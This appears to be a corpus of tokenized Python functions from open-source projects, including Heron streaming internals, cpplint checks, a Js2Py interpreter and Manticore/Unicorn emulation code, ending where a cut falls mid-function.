def add in streams ( self , bolt ) : if self . inputs is None : return # sanitize inputs and get a map <Global Stream Id -> Grouping> input dict = self . sanitize inputs ( ) for global streamid , gtype in input dict . items ( ) : in stream = bolt . inputs . add ( ) in stream . stream . Copy From ( self . get stream id ( global streamid . component id , global streamid . stream id ) ) if isinstance ( gtype , Grouping . FIELDS ) : # it's a field grouping in stream . gtype = gtype . gtype in stream . grouping fields . Copy From ( self . get stream schema ( gtype . fields ) ) elif isinstance ( gtype , Grouping . CUSTOM ) : # it's a custom grouping in stream . gtype = gtype . gtype in stream . custom grouping object = gtype . python serialized in stream . type = topology pb2 . Custom Grouping Object Type . Value ( "PYTHON OBJECT" ) else : in stream . gtype = gtype
def add out streams ( self , spbl ) : if self . outputs is None : return # sanitize outputs and get a map <stream id -> out fields> output map = self . sanitize outputs ( ) for stream id , out fields in output map . items ( ) : out stream = spbl . outputs . add ( ) out stream . stream . Copy From ( self . get stream id ( self . name , stream id ) ) out stream . schema . Copy From ( self . get stream schema ( out fields ) )
def get out streamids ( self ) : if self . outputs is None : return set ( ) if not isinstance ( self . outputs , ( list , tuple ) ) : raise Type Error ( "Argument to outputs must be either list or tuple, given: %s" % str ( type ( self . outputs ) ) ) ret lst = [ ] for output in self . outputs : if not isinstance ( output , ( str , Stream ) ) : raise Type Error ( "Outputs must be a list of strings or Streams, given: %s" % str ( output ) ) ret lst . append ( Stream . DEFAULT STREAM ID if isinstance ( output , str ) else output . stream id ) return set ( ret lst )
def get stream id ( comp name , stream id ) : proto stream id = topology pb2 . Stream Id ( ) proto stream id . id = stream id proto stream id . component name = comp name return proto stream id
def get stream schema ( fields ) : stream schema = topology pb2 . Stream Schema ( ) for field in fields : key = stream schema . keys . add ( ) key . key = field key . type = topology pb2 . Type . Value ( "OBJECT" ) return stream schema
def register metric ( self , name , metric , time bucket in sec ) : collector = self . get metrics collector ( ) collector . register metric ( name , metric , time bucket in sec )
def get component tasks ( self , component id ) : ret = [ ] for task id , comp id in self . task to component map . items ( ) : if comp id == component id : ret . append ( task id ) return ret
def get metrics collector ( self ) : if self . metrics collector is None or not isinstance ( self . metrics collector , Metrics Collector ) : raise Runtime Error ( "Metrics collector is not registered in this context" ) return self . metrics collector
def setup ( self , context ) : myindex = context . get partition index ( ) self . files to consume = self . files [ myindex : : context . get num partitions ( ) ] self . logger . info ( "Text File Spout files to consume %s" % self . files to consume ) self . lines to consume = self . get next lines ( ) self . emit count = 0
def add verbose ( parser ) : parser . add argument ( '--verbose' , metavar = '(a boolean; default: "false")' , type = bool , default = False ) return parser
def add tracker url ( parser ) : parser . add argument ( '--tracker url' , metavar = '(tracker url; default: "' + DEFAULT TRACKER URL + '")' , type = str , default = DEFAULT TRACKER URL ) return parser
def hex escape ( bin str ) : printable = string . ascii letters + string . digits + string . punctuation + ' ' return '' . join ( ch if ch in printable else r'0x{0:02x}' . format ( ord ( ch ) ) for ch in bin str )
def handle assignment message ( self , pplan ) : Log . debug ( "In handle assignment message() of ST Stmgr Client, Physical Plan: \n%s" , str ( pplan ) ) self . heron instance cls . handle assignment msg ( pplan )
def send ( self , dispatcher ) : if self . sent complete : return sent = dispatcher . send ( self . to send ) self . to send = self . to send [ sent : ]
def read ( self , dispatcher ) : try : if not self . is header read : # try reading header to read = Heron Protocol . HEADER SIZE - len ( self . header ) self . header += dispatcher . recv ( to read ) if len ( self . header ) == Heron Protocol . HEADER SIZE : self . is header read = True else : Log . debug ( "Header read incomplete; read %d bytes of header" % len ( self . header ) ) return if self . is header read and not self . is complete : # try reading data to read = self . get datasize ( ) - len ( self . data ) self . data += dispatcher . recv ( to read ) if len ( self . data ) == self . get datasize ( ) : self . is complete = True except socket . error as e : if e . errno == socket . errno . EAGAIN or e . errno == socket . errno . EWOULDBLOCK : # Try again later -> call continue read later Log . debug ( "Try again error" ) else : # Fatal error Log . debug ( "Fatal error when reading Incoming Packet" ) raise Runtime Error ( "Fatal error occured in Incoming Packet.read()" )
def generate ( ) : data bytes = bytearray ( random . getrandbits ( 8 ) for i in range ( REQID . REQID SIZE ) ) return REQID ( data bytes )
def yaml config reader ( config path ) : if not config path . endswith ( ".yaml" ) : raise Value Error ( "Config file not yaml" ) with open ( config path , 'r' ) as f : config = yaml . load ( f ) return config
def send buffered messages ( self ) : while not self . out stream . is empty ( ) and self . stmgr client . is registered : tuple set = self . out stream . poll ( ) if isinstance ( tuple set , tuple pb2 . Heron Tuple Set ) : tuple set . src task id = self . my pplan helper . my task id self . gateway metrics . update sent packet ( tuple set . Byte Size ( ) ) self . stmgr client . send message ( tuple set )
def handle state change msg ( self , new helper ) : assert self . my pplan helper is not None assert self . my instance is not None and self . my instance . py class is not None if self . my pplan helper . get topology state ( ) != new helper . get topology state ( ) : # handle state change # update the pplan helper self . my pplan helper = new helper if new helper . is topology running ( ) : if not self . is instance started : self . start instance if possible ( ) self . my instance . py class . invoke activate ( ) elif new helper . is topology paused ( ) : self . my instance . py class . invoke deactivate ( ) else : raise Runtime Error ( "Unexpected Topology State update: %s" % new helper . get topology state ( ) ) else : Log . info ( "Topology state remains the same." )
def get topology config ( self ) : if self . pplan . topology . Has Field ( "topology config" ) : return self . get dict from config ( self . pplan . topology . topology config ) else : return { }
def set topology context ( self , metrics collector ) : Log . debug ( "Setting topology context" ) cluster config = self . get topology config ( ) cluster config . update ( self . get dict from config ( self . my component . config ) ) task to component map = self . get task to comp map ( ) self . context = Topology Context Impl ( cluster config , self . pplan . topology , task to component map , self . my task id , metrics collector , self . topology pex abs path )
def setup custom grouping ( self , topology ) : for i in range ( len ( topology . bolts ) ) : for in stream in topology . bolts [ i ] . inputs : if in stream . stream . component name == self . my component name and in stream . gtype == topology pb2 . Grouping . Value ( "CUSTOM" ) : # this bolt takes my output in custom grouping manner if in stream . type == topology pb2 . Custom Grouping Object Type . Value ( "PYTHON OBJECT" ) : custom grouping obj = default serializer . deserialize ( in stream . custom grouping object ) if isinstance ( custom grouping obj , str ) : pex loader . load pex ( self . topology pex abs path ) grouping cls = pex loader . import and get class ( self . topology pex abs path , custom grouping obj ) custom grouping obj = grouping cls ( ) assert isinstance ( custom grouping obj , I Custom Grouping ) self . custom grouper . add ( in stream . stream . id , self . get taskids for component ( topology . bolts [ i ] . comp . name ) , custom grouping obj , self . my component name ) elif in stream . type == topology pb2 . Custom Grouping Object Type . Value ( "JAVA OBJECT" ) : raise Not Implemented Error ( "Java-serialized custom grouping is not yet supported " "for python topology" ) else : raise Value Error ( "Unrecognized custom grouping type found: %s" % str ( in stream . type ) )
def prepare ( self , context ) : for stream id , targets in self . targets . items ( ) : for target in targets : target . prepare ( context , stream id )
def choose tasks ( self , stream id , values ) : if stream id not in self . targets : return [ ] ret = [ ] for target in self . targets [ stream id ] : ret . extend ( target . choose tasks ( values ) ) return ret
def format mode ( sres ) : mode = sres . st mode root = ( mode & 0o700 ) >> 6 group = ( mode & 0o070 ) >> 3 user = ( mode & 0o7 ) def stat type ( md ) : ''' stat type''' if stat . S ISDIR ( md ) : return 'd' elif stat . S ISSOCK ( md ) : return 's' else : return '-' def triple ( md ) : ''' triple ''' return '%c%c%c' % ( 'r' if md & 0b100 else '-' , 'w' if md & 0b010 else '-' , 'x' if md & 0b001 else '-' ) return '' . join ( [ stat type ( mode ) , triple ( root ) , triple ( group ) , triple ( user ) ] )
def format mtime ( mtime ) : now = datetime . now ( ) dt = datetime . fromtimestamp ( mtime ) return '%s %2d %5s' % ( dt . strftime ( '%b' ) , dt . day , dt . year if dt . year != now . year else dt . strftime ( '%H:%M' ) )
def read chunk ( filename , offset = - 1 , length = - 1 , escape data = False ) : try : length = int ( length ) offset = int ( offset ) except Value Error : return { } if not os . path . isfile ( filename ) : return { } try : fstat = os . stat ( filename ) except Exception : return { } if offset == - 1 : offset = fstat . st size if length == - 1 : length = fstat . st size - offset with open ( filename , "r" ) as fp : fp . seek ( offset ) try : data = fp . read ( length ) except IO Error : return { } if data : data = escape data ( data ) if escape data else data return dict ( offset = offset , length = len ( data ) , data = data ) return dict ( offset = offset , length = 0 )
def str cmd ( cmd , cwd , env ) : process = subprocess . Popen ( cmd , stdout = subprocess . PIPE , stderr = subprocess . PIPE , cwd = cwd , env = env ) stdout builder , stderr builder = proc . async stdout stderr builder ( process ) process . wait ( ) stdout , stderr = stdout builder . result ( ) , stderr builder . result ( ) return { 'command' : ' ' . join ( cmd ) , 'stderr' : stderr , 'stdout' : stdout }
def to table ( metrics ) : all queries = tracker access . metric queries ( ) m = tracker access . queries map ( ) names = metrics . values ( ) [ 0 ] . keys ( ) stats = [ ] for n in names : info = [ n ] for field in all queries : try : info . append ( str ( metrics [ field ] [ n ] ) ) except Key Error : pass stats . append ( info ) header = [ 'container id' ] + [ m [ k ] for k in all queries if k in metrics . keys ( ) ] return stats , header
def Match ( pattern , s ) : # The regexp compilation caching is inlined in both Match and Search for # performance reasons; factoring it out into a separate function turns out # to be noticeably expensive. if pattern not in regexp compile cache : regexp compile cache [ pattern ] = sre compile . compile ( pattern ) return regexp compile cache [ pattern ] . match ( s )
def Search ( pattern , s ) : if pattern not in regexp compile cache : regexp compile cache [ pattern ] = sre compile . compile ( pattern ) return regexp compile cache [ pattern ] . search ( s )
def Find Next Multi Line Comment Start ( lines , lineix ) : while lineix < len ( lines ) : if lines [ lineix ] . strip ( ) . startswith ( '/*' ) : # Only return this marker if the comment goes beyond this line if lines [ lineix ] . strip ( ) . find ( '*/' , 2 ) < 0 : return lineix lineix += 1 return len ( lines )
def Find Next Multi Line Comment End ( lines , lineix ) : while lineix < len ( lines ) : if lines [ lineix ] . strip ( ) . endswith ( '*/' ) : return lineix lineix += 1 return len ( lines )
def Remove Multi Line Comments From Range ( lines , begin , end ) : # Having // dummy comments makes the lines non-empty, so we will not get # unnecessary blank line warnings later in the code. for i in range ( begin , end ) : lines [ i ] = '/**/'
def Check For Copyright ( filename , lines , error ) : # We'll say it should occur by line 10. Don't forget there's a # dummy line at the front. for line in range ( 1 , min ( len ( lines ) , 11 ) ) : if re . search ( r'Copyright' , lines [ line ] , re . I ) : break else : # means no copyright line was found error ( filename , 0 , 'legal/copyright' , 5 , 'No copyright message found.  ' 'You should have a line: "Copyright [year] <Copyright Owner>"' )
def Check Header File Included ( filename , include state , error ) : # Do not check test files fileinfo = File Info ( filename ) if Search ( TEST FILE SUFFIX , fileinfo . Base Name ( ) ) : return for ext in Get Header Extensions ( ) : basefilename = filename [ 0 : len ( filename ) - len ( fileinfo . Extension ( ) ) ] headerfile = basefilename + '.' + ext if not os . path . exists ( headerfile ) : continue headername = File Info ( headerfile ) . Repository Name ( ) first include = None for section list in include state . include list : for f in section list : if headername in f [ 0 ] or f [ 0 ] in headername : return if not first include : first include = f [ 1 ] error ( filename , first include , 'build/include' , 5 , '%s should include its header file %s' % ( fileinfo . Repository Name ( ) , headername ) )
def Set Verbose Level ( self , level ) : last verbose level = self . verbose level self . verbose level = level return last verbose level
def Add Filters ( self , filters ) : for filt in filters . split ( ',' ) : clean filt = filt . strip ( ) if clean filt : self . filters . append ( clean filt ) for filt in self . filters : if not ( filt . startswith ( '+' ) or filt . startswith ( '-' ) ) : raise Value Error ( 'Every filter in --filters must start with + or -' ' (%s does not)' % filt )
def Increment Error Count ( self , category ) : self . error count += 1 if self . counting in ( 'toplevel' , 'detailed' ) : if self . counting != 'detailed' : category = category . split ( '/' ) [ 0 ] if category not in self . errors by category : self . errors by category [ category ] = 0 self . errors by category [ category ] += 1
def Print Error Counts ( self ) : for category , count in sorted ( iteritems ( self . errors by category ) ) : self . Print Info ( 'Category \'%s\' errors found: %d\n' % ( category , count ) ) if self . error count > 0 : self . Print Info ( 'Total errors found: %d\n' % self . error count )
def Check End ( self , filename , clean lines , linenum , error ) : line = clean lines . raw lines [ linenum ] # Check how many lines is enclosed in this namespace.  Don't issue # warning for missing namespace comments if there aren't enough # lines.  However, do apply checks if there is already an end of # namespace comment and it's incorrect. # # TODO(unknown): We always want to check end of namespace comments # if a namespace is large, but sometimes we also want to apply the # check if a short namespace contained nontrivial things (something # other than forward declarations).  There is currently no logic on # deciding what these nontrivial things are, so this check is # triggered by namespace size only, which works most of the time. if ( linenum - self . starting linenum < 10 and not Match ( r'^\s*};*\s*(//|/\*).*\bnamespace\b' , line ) ) : return # Look for matching comment at end of namespace. # # Note that we accept C style "/* */" comments for terminating # namespaces, so that code that terminate namespaces inside # preprocessor macros can be cpplint clean. # # We also accept stuff like "// end of namespace <name>." with the # period at the end. # # Besides these, we don't accept anything else, otherwise we might # get false negatives when existing comment is a substring of the # expected namespace. if self . name : # Named namespace if not Match ( ( r'^\s*};*\s*(//|/\*).*\bnamespace\s+' + re . escape ( self . name ) + r'[\*/\.\\\s]*$' ) , line ) : error ( filename , linenum , 'readability/namespace' , 5 , 'Namespace should be terminated with "// namespace %s"' % self . name ) else : # Anonymous namespace if not Match ( r'^\s*};*\s*(//|/\*).*\bnamespace[\*/\.\\\s]*$' , line ) : # If "// namespace anonymous" or "// anonymous namespace (more text)", # mention "// anonymous namespace" as an acceptable form if Match ( r'^\s*}.*\b(namespace anonymous|anonymous namespace)\b' , line ) : error ( filename , linenum , 'readability/namespace' , 5 , 'Anonymous namespace should be terminated with "// namespace"' ' or "// anonymous namespace"' ) else : error ( filename , linenum , 'readability/namespace' , 5 , 'Anonymous namespace should be terminated with "// namespace"' )
def map ( self , map function ) : from heronpy . streamlet . impl . mapbolt import Map Streamlet map streamlet = Map Streamlet ( map function , self ) self . add child ( map streamlet ) return map streamlet
def filter ( self , filter function ) : from heronpy . streamlet . impl . filterbolt import Filter Streamlet filter streamlet = Filter Streamlet ( filter function , self ) self . add child ( filter streamlet ) return filter streamlet
def union ( self , other streamlet ) : from heronpy . streamlet . impl . unionbolt import Union Streamlet union streamlet = Union Streamlet ( self , other streamlet ) self . add child ( union streamlet ) other streamlet . add child ( union streamlet ) return union streamlet
def log ( self ) : from heronpy . streamlet . impl . logbolt import Log Streamlet log streamlet = Log Streamlet ( self ) self . add child ( log streamlet ) return
def consume ( self , consume function ) : from heronpy . streamlet . impl . consumebolt import Consume Streamlet consume streamlet = Consume Streamlet ( consume function , self ) self . add child ( consume streamlet ) return
def join ( self , join streamlet , window config , join function ) : from heronpy . streamlet . impl . joinbolt import Join Streamlet , Join Bolt join streamlet result = Join Streamlet ( Join Bolt . INNER , window config , join function , self , join streamlet ) self . add child ( join streamlet result ) join streamlet . add child ( join streamlet result ) return join streamlet result
def outer right join ( self , join streamlet , window config , join function ) : from heronpy . streamlet . impl . joinbolt import Join Streamlet , Join Bolt join streamlet result = Join Streamlet ( Join Bolt . OUTER RIGHT , window config , join function , self , join streamlet ) self . add child ( join streamlet result ) join streamlet . add child ( join streamlet result ) return join streamlet result
def outer left join ( self , join streamlet , window config , join function ) : from heronpy . streamlet . impl . joinbolt import Join Streamlet , Join Bolt join streamlet result = Join Streamlet ( Join Bolt . OUTER LEFT , window config , join function , self , join streamlet ) self . add child ( join streamlet result ) join streamlet . add child ( join streamlet result ) return join streamlet result
def outer join ( self , join streamlet , window config , join function ) : from heronpy . streamlet . impl . joinbolt import Join Streamlet , Join Bolt join streamlet result = Join Streamlet ( Join Bolt . OUTER , window config , join function , self , join streamlet ) self . add child ( join streamlet result ) join streamlet . add child ( join streamlet result ) return join streamlet result
def expand args ( command ) : # Prepare arguments. if isinstance ( command , ( str , unicode ) ) : splitter = shlex . shlex ( command . encode ( 'utf-8' ) ) splitter . whitespace = '|' splitter . whitespace split = True command = [ ] while True : token = splitter . get token ( ) if token : command . append ( token ) else : break command = list ( map ( shlex . split , command ) ) return command
def connect ( command , data = None , env = None , cwd = None ) : # TODO: support piped commands command str = expand args ( command ) . pop ( ) environ = dict ( os . environ ) environ . update ( env or { } ) process = subprocess . Popen ( command str , universal newlines = True , shell = False , env = environ , stdin = subprocess . PIPE , stdout = subprocess . PIPE , stderr = subprocess . PIPE , bufsize = 0 , cwd = cwd , ) return Connected Command ( process = process )
def send ( self , str , end = '\n' ) : return self . process . stdin . write ( str + end )
def Js ( val , Clamped = False ) : if isinstance ( val , Py Js ) : return val elif val is None : return undefined elif isinstance ( val , basestring ) : return Py Js String ( val , String Prototype ) elif isinstance ( val , bool ) : return true if val else false elif isinstance ( val , float ) or isinstance ( val , int ) or isinstance ( val , long ) or ( NUMPY AVAILABLE and isinstance ( val , ( numpy . int8 , numpy . uint8 , numpy . int16 , numpy . uint16 , numpy . int32 , numpy . uint32 , numpy . float32 , numpy . float64 ) ) ) : # This is supposed to speed things up. may not be the case if val in NUM BANK : return NUM BANK [ val ] return Py Js Number ( float ( val ) , Number Prototype ) elif isinstance ( val , Function Type ) : return Py Js Function ( val , Function Prototype ) #elif isinstance(val, Module Type): #    mod = {} #    for name in dir(val): #        value = getattr(val, name) #        if isinstance(value, Module Type): #            continue  # prevent recursive module conversion #        try: #            jsval = H Js(value) #        except Runtime Error: #            print 'Could not convert %s to Py Js object!' % name #            continue #        mod[name] = jsval #    return Js(mod) #elif isintance(val, Class Type): elif isinstance ( val , dict ) : # convert to object temp = Py Js Object ( { } , Object Prototype ) for k , v in six . iteritems ( val ) : temp . put ( Js ( k ) , Js ( v ) ) return temp elif isinstance ( val , ( list , tuple ) ) : #Convert to array return Py Js Array ( val , Array Prototype ) # convert to typedarray elif isinstance ( val , Js Object Wrapper ) : return val . dict [ ' obj' ] elif NUMPY AVAILABLE and isinstance ( val , numpy . ndarray ) : if val . dtype == numpy . int8 : return Py Js Int8Array ( val , Int8Array Prototype ) elif val . dtype == numpy . uint8 and not Clamped : return Py Js Uint8Array ( val , Uint8Array Prototype ) elif val . dtype == numpy . uint8 and Clamped : return Py Js Uint8Clamped Array ( val , Uint8Clamped Array Prototype ) elif val . dtype == numpy . int16 : return Py Js Int16Array ( val , Int16Array Prototype ) elif val . dtype == numpy . uint16 : return Py Js Uint16Array ( val , Uint16Array Prototype ) elif val . dtype == numpy . int32 : return Py Js Int32Array ( val , Int32Array Prototype ) elif val . dtype == numpy . uint32 : return Py Js Uint16Array ( val , Uint32Array Prototype ) elif val . dtype == numpy . float32 : return Py Js Float32Array ( val , Float32Array Prototype ) elif val . dtype == numpy . float64 : return Py Js Float64Array ( val , Float64Array Prototype ) else : # try to convert to js object return py wrap ( val )
def set name ( self , name ) : if self . own . get ( 'name' ) : self . func name = name self . own [ 'name' ] [ 'value' ] = Js ( name )
def Construct Array ( self , py arr ) : arr = self . New Array ( len ( py arr ) ) arr . init ( py arr ) return arr
def Construct Object ( self , py obj ) : obj = self . New Object ( ) for k , v in py obj . items ( ) : obj . put ( unicode ( k ) , v ) return obj
def emit ( self , op code , * args ) : self . tape . append ( OP CODES [ op code ] ( * args ) )
def compile ( self , start loc = 0 ) : self . label locs = { } if self . label locs is None else self . label locs loc = start loc while loc < len ( self . tape ) : if type ( self . tape [ loc ] ) == LABEL : self . label locs [ self . tape [ loc ] . num ] = loc del self . tape [ loc ] continue loc += 1 self . compiled = True
def pad ( num , n = 2 , sign = False ) : s = unicode ( abs ( num ) ) if len ( s ) < n : s = '0' * ( n - len ( s ) ) + s if not sign : return s if num >= 0 : return '+' + s else : return '-' + s
def replacement template ( rep , source , span , npar ) : n = 0 res = '' while n < len ( rep ) - 1 : char = rep [ n ] if char == '$' : if rep [ n + 1 ] == '$' : res += '$' n += 2 continue elif rep [ n + 1 ] == '`' : # replace with string that is BEFORE match res += source [ : span [ 0 ] ] n += 2 continue elif rep [ n + 1 ] == '\'' : # replace with string that is AFTER match res += source [ span [ 1 ] : ] n += 2 continue elif rep [ n + 1 ] in DIGS : dig = rep [ n + 1 ] if n + 2 < len ( rep ) and rep [ n + 2 ] in DIGS : dig += rep [ n + 2 ] num = int ( dig ) # we will not do any replacements if we dont have this npar or dig is 0 if not num or num > len ( npar ) : res += '$' + dig else : # None - undefined has to be replaced with '' res += npar [ num - 1 ] if npar [ num - 1 ] else '' n += 1 + len ( dig ) continue res += char n += 1 if n < len ( rep ) : res += rep [ - 1 ] return res
def emit ( self , what , * args ) : if isinstance ( what , basestring ) : return self . exe . emit ( what , * args ) elif isinstance ( what , list ) : self . emit statement list ( what ) else : return getattr ( self , what [ 'type' ] ) ( * * what )
def to key ( literal or identifier ) : if literal or identifier [ 'type' ] == 'Identifier' : return literal or identifier [ 'name' ] elif literal or identifier [ 'type' ] == 'Literal' : k = literal or identifier [ 'value' ] if isinstance ( k , float ) : return unicode ( float repr ( k ) ) elif 'regex' in literal or identifier : return compose regex ( k ) elif isinstance ( k , bool ) : return 'true' if k else 'false' elif k is None : return 'null' else : return unicode ( k )
def trans ( ele , standard = False ) : try : node = globals ( ) . get ( ele [ 'type' ] ) if not node : raise Not Implemented Error ( '%s is not supported!' % ele [ 'type' ] ) if standard : node = node . dict [ 'standard' ] if 'standard' in node . dict else node return node ( * * ele ) except : #print ele raise
def is lval ( t ) : if not t : return False i = iter ( t ) if i . next ( ) not in IDENTIFIER START : return False return all ( e in IDENTIFIER PART for e in i )
def eval ( self , expression , use compilation plan = False ) : code = 'Py Js Eval Result = eval(%s)' % json . dumps ( expression ) self . execute ( code , use compilation plan = use compilation plan ) return self [ 'Py Js Eval Result' ]
def to key ( literal or identifier ) : if literal or identifier [ 'type' ] == 'Identifier' : return literal or identifier [ 'name' ] elif literal or identifier [ 'type' ] == 'Literal' : k = literal or identifier [ 'value' ] if isinstance ( k , float ) : return unicode ( float repr ( k ) ) elif 'regex' in literal or identifier : return compose regex ( k ) elif isinstance ( k , bool ) : return u'true' if k else u'false' elif k is None : return u'null' else : return unicode ( k )
def to arr ( this ) : return [ this . get ( str ( e ) ) for e in xrange ( len ( this ) ) ]
def match ( self , string , pos ) : return self . pat . match ( string , int ( pos ) )
def call ( self , this , args = ( ) ) : if self . is native : args = Space Tuple ( args ) # we have to do that unfortunately to pass all the necessary info to the funcs args . space = self . space return self . code ( this , args ) # must return valid js object - undefined, null, float, unicode, bool, or Py Js else : return self . space . exe . call ( self , this , args )
def is empty object ( n , last ) : if n . strip ( ) : return False # seems to be but can be empty code last = last . strip ( ) markers = { ')' , ';' , } if not last or last [ - 1 ] in markers : return False return True
def parse exponent ( source , start ) : if not source [ start ] in { 'e' , 'E' } : if source [ start ] in IDENTIFIER PART : raise Syntax Error ( 'Invalid number literal!' ) return start start += 1 if source [ start ] in { '-' , '+' } : start += 1 FOUND = False # we need at least one dig after exponent while source [ start ] in NUMS : FOUND = True start += 1 if not FOUND or source [ start ] in IDENTIFIER PART : raise Syntax Error ( 'Invalid number literal!' ) return start
def in op ( self , other ) : if not is object ( other ) : raise Make Error ( 'Type Error' , "You can\'t use 'in' operator to search in non-objects" ) return other . has property ( to string ( self ) )
def maybe download and extract ( ) : dest directory = '.' filename = DATA URL . split ( '/' ) [ - 1 ] filepath = os . path . join ( dest directory , filename ) if not os . path . exists ( filepath ) : def progress ( count , block size , total size ) : sys . stdout . write ( '\r>> Downloading %s %.1f%%' % ( filename , float ( count * block size ) / float ( total size ) * 100.0 ) ) sys . stdout . flush ( ) filepath , = urllib . request . urlretrieve ( DATA URL , filepath , progress ) print ( ) statinfo = os . stat ( filepath ) print ( 'Successfully downloaded' , filename , statinfo . st size , 'bytes.' ) extracted dir path = os . path . join ( dest directory , 'trees' ) if not os . path . exists ( extracted dir path ) : zip ref = zipfile . Zip File ( filepath , 'r' ) zip ref . extractall ( dest directory ) zip ref . close ( )
def pythonize arguments ( arg str ) : out args = [ ] # If there aren't any arguments return the empty string if arg str is None : return out str args = arg str . split ( ',' ) for arg in args : components = arg . split ( '=' ) name and type = components [ 0 ] . split ( ' ' ) # There is probably type info if name and type [ - 1 ] == '' and len ( name and type ) > 1 : name = name and type [ - 2 ] else : name = name and type [ - 1 ] # if there are default parameters if len ( components ) > 1 : name += '=' + components [ 1 ] out args . append ( name ) return ',' . join ( out args )
def correspond ( text ) : if text : subproc . stdin . write ( text ) subproc . stdin . flush ( ) return get lines ( )
def access ok ( self , access ) : for c in access : if c not in self . perms : return False return True
def in range ( self , index ) : if isinstance ( index , slice ) : in range = index . start < index . stop and index . start >= self . start and index . stop <= self . end else : in range = index >= self . start and index <= self . end return in range
def execute ( self ) : if issymbolic ( self . PC ) : raise Concretize Register ( self , 'PC' , policy = 'ALL' ) if not self . memory . access ok ( self . PC , 'x' ) : raise Invalid Memory Access ( self . PC , 'x' ) self . publish ( 'will decode instruction' , self . PC ) insn = self . decode instruction ( self . PC ) self . last pc = self . PC self . publish ( 'will execute instruction' , self . PC , insn ) # FIXME (theo) why just return here? if insn . address != self . PC : return name = self . canonicalize instruction name ( insn ) if logger . level == logging . DEBUG : logger . debug ( self . render instruction ( insn ) ) for l in self . render registers ( ) : register logger . debug ( l ) try : if self . concrete and 'SYSCALL' in name : self . emu . sync unicorn to manticore ( ) if self . concrete and 'SYSCALL' not in name : self . emulate ( insn ) if self . PC == self . break unicorn at : logger . debug ( "Switching from Unicorn to Manticore" ) self . break unicorn at = None self . concrete = False else : implementation = getattr ( self , name , None ) if implementation is not None : implementation ( * insn . operands ) else : text bytes = ' ' . join ( '%02x' % x for x in insn . bytes ) logger . warning ( "Unimplemented instruction: 0x%016x:\t%s\t%s\t%s" , insn . address , text bytes , insn . mnemonic , insn . op str ) self . backup emulate ( insn ) except ( Interruption , Syscall ) as e : e . on handled = lambda : self . publish instruction as executed ( insn ) raise e else : self . publish instruction as executed ( insn )
def publish instruction as executed ( self , insn ) : self . icount += 1 self . publish ( 'did execute instruction' , self . last pc , self . PC , insn )
def viz trace ( view ) : tv = Trace Visualizer ( view , None ) if tv . workspace is None : tv . workspace = get workspace ( ) tv . visualize ( )
def viz live trace ( view ) : tv = Trace Visualizer ( view , None , live = True ) if tv . workspace is None : tv . workspace = get workspace ( ) # update due to singleton in case we are called after a clear tv . live update = True tv . visualize ( )
def visualize ( self ) : if os . path . isfile ( self . workspace ) : t = threading . Thread ( target = self . highlight from file , args = ( self . workspace , ) ) elif os . path . isdir ( self . workspace ) : t = threading . Thread ( target = self . highlight from dir , args = ( self . workspace , ) ) t . start ( )
def invalidate cache ( cpu , address , size ) : cache = cpu . instruction cache for offset in range ( size ) : if address + offset in cache : del cache [ address + offset ]
def LJMP ( cpu , cs selector , target ) : logger . info ( "LJMP: Jumping to: %r:%r" , cs selector . read ( ) , target . read ( ) ) cpu . CS = cs selector . read ( ) cpu . PC = target . read ( )
def hook xfer mem ( self , uc , access , address , size , value , data ) : assert access in ( UC MEM WRITE , UC MEM READ , UC MEM FETCH ) if access == UC MEM WRITE : self . cpu . write int ( address , value , size * 8 ) # If client code is attempting to read a value, we need to bring it # in from Manticore state. If we try to mem write it here, Unicorn # will segfault. We add the value to a list of things that need to # be written, and ask to restart the emulation. elif access == UC MEM READ : value = self . cpu . read bytes ( address , size ) if address in self . should be written : return True self . should be written [ address ] = value self . should try again = True return False return True
def hook unmapped ( self , uc , access , address , size , value , data ) : try : m = self . create emulated mapping ( uc , address ) except Memory Exception as e : self . to raise = e self . should try again = False return False self . should try again = True return False
def emulate ( self , instruction ) : # The emulation might restart if Unicorn needs to bring in a memory map # or bring a value from Manticore state. while True : self . reset ( ) # Establish Manticore state, potentially from past emulation # attempts for base in self . should be mapped : size , perms = self . should be mapped [ base ] self . emu . mem map ( base , size , perms ) for address , values in self . should be written . items ( ) : for offset , byte in enumerate ( values , start = address ) : if issymbolic ( byte ) : from . . native . cpu . abstractcpu import Concretize Memory raise Concretize Memory ( self . cpu . memory , offset , 8 , "Concretizing for emulation" ) self . emu . mem write ( address , b'' . join ( values ) ) # Try emulation self . should try again = False self . step ( instruction ) if not self . should try again : break
def step ( self , instruction ) : logger . debug ( "0x%x:\t%s\t%s" % ( instruction . address , instruction . mnemonic , instruction . op str ) ) registers = set ( self . cpu . canonical registers ) # Refer to EFLAGS instead of individual flags for x86 if self . cpu . arch == CS ARCH X86 : # The last 8 canonical registers of x86 are individual flags; replace # with the eflags registers -= set ( [ 'CF' , 'PF' , 'AF' , 'ZF' , 'SF' , 'IF' , 'DF' , 'OF' ] ) registers . add ( 'EFLAGS' ) # TODO(mark): Unicorn 1.0.1 does not support reading YMM registers, # and simply returns back zero. If a unicorn emulated instruction writes to an # XMM reg, we will read back the corresponding YMM register, resulting in an # incorrect zero value being actually written to the XMM register. This is # fixed in Unicorn PR #819, so when that is included in a release, delete # these two lines. registers -= set ( [ 'YMM0' , 'YMM1' , 'YMM2' , 'YMM3' , 'YMM4' , 'YMM5' , 'YMM6' , 'YMM7' , 'YMM8' , 'YMM9' , 'YMM10' , 'YMM11' , 'YMM12' , 'YMM13' , 'YMM14' , 'YMM15' ] ) registers |= set ( [ 'XMM0' , 'XMM1' , 'XMM2' , 'XMM3' , 'XMM4' , 'XMM5' , 'XMM6' , 'XMM7' , 'XMM8' , 'XMM9' , 'XMM10' , 'XMM11' , 'XMM12' , 'XMM13' , 'XMM14' , 'XMM15' ] ) # XXX(yan): This concretizes the entire register state. This is overly # aggressive. Once capstone adds consistent support for accessing # referred registers, make this only concretize those registers being # read from. for reg in registers : val = self . cpu . read register ( reg ) if issymbolic ( val ) : from . . native . cpu . abstractcpu import Concretize Register raise Concretize Register ( self . cpu , reg , "Concretizing for emulation." , policy = 'ONE' ) self . emu . reg write ( self . to unicorn id ( reg ) , val ) # Bring in the instruction itself instruction = self . cpu . decode instruction ( self . cpu . PC ) text bytes = self . cpu . read bytes ( self . cpu . PC , instruction . size ) self . emu . mem write ( self . cpu . PC , b'' . join ( text bytes ) ) self . emu . hook add ( UC HOOK MEM READ UNMAPPED , self . hook unmapped ) self . emu . hook add ( UC HOOK MEM WRITE UNMAPPED , self . hook unmapped ) self . emu . hook add ( UC HOOK MEM FETCH UNMAPPED , self . hook unmapped ) self . emu . hook add ( UC HOOK MEM READ , self . hook xfer mem ) self . emu . hook add ( UC HOOK 